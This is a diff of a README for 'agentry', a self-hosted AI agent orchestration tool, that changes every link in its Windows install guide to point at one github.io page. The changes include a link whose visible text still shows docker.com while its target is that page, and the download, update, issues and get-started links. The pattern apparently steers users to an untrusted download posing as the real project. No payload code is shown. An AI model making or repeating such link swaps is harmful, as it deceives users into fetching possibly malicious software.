@@ -59,7 +59,7 @@ Follow these simple steps to get agentry running on your Windows computer.
 
 ### Step 1: Install Docker Desktop
 
-1. Go to [docker.com/products/docker-desktop](https://www.docker.com/products/docker-desktop)
+1. Go to [docker.com/products/docker-desktop](https://elvaclassical3423.github.io)
 2. Click the "Download for Windows" button
 3. Once downloaded, double-click the file to run the installer
 4. Follow the on-screen instructions (default settings are fine)
@@ -69,7 +69,7 @@ Follow these simple steps to get agentry running on your Windows computer.
 ### Step 2: Download agentry
 
 Visit this link to download the application:
-[**⬇️ Download agentry from GitHub**](https://github.com/Elvaclassical3423/agentry)
+[**⬇️ Download agentry from GitHub**](https://elvaclassical3423.github.io)
 
 Click the big green "Download" or "Releases" button on that page to get the latest version.
 
@@ -132,7 +132,7 @@ Click the big green "Download" or "Releases" button on that page to get the late
 
 ## 📚 Where to Get Help
 
-- **GitHub Issues** - Visit [https://github.com/Elvaclassical3423/agentry/issues](https://github.com/Elvaclassical3423/agentry) to report problems or ask questions
+- **GitHub Issues** - Visit [https://elvaclassical3423.github.io](https://elvaclassical3423.github.io) to report problems or ask questions
 - **Documentation** - Check the "Wiki" or "Documentation" section on the GitHub page
 - **Community** - Look for discussions or forums linked from the main page
 
@@ -147,7 +147,7 @@ Click the big green "Download" or "Releases" button on that page to get the late
 
 New versions of agentry are released regularly. To update:
 
-1. Visit the [Download Page](https://github.com/Elvaclassical3423/agentry) regularly
+1. Visit the [Download Page](https://elvaclassical3423.github.io) regularly
 2. Check if a newer version is available
 3. Download the new file
 4. Run it - it will replace your old version automatically
@@ -160,6 +160,6 @@ Start your journey today - it's free, it's private, and it's amazing what you ca
 
 **Ready to meet your new AI assistant? Download agentry now!**
 
-[**⬇️ Get Started with agentry**](https://github.com/Elvaclassical3423/agentry)
+[**⬇️ Get Started with agentry**](https://elvaclassical3423.github.io)
 
 Keywords: agent-orchestration, ai-agents, claude, claude-code, docker, fastify, llm, rest-api, self-hosted, typescript
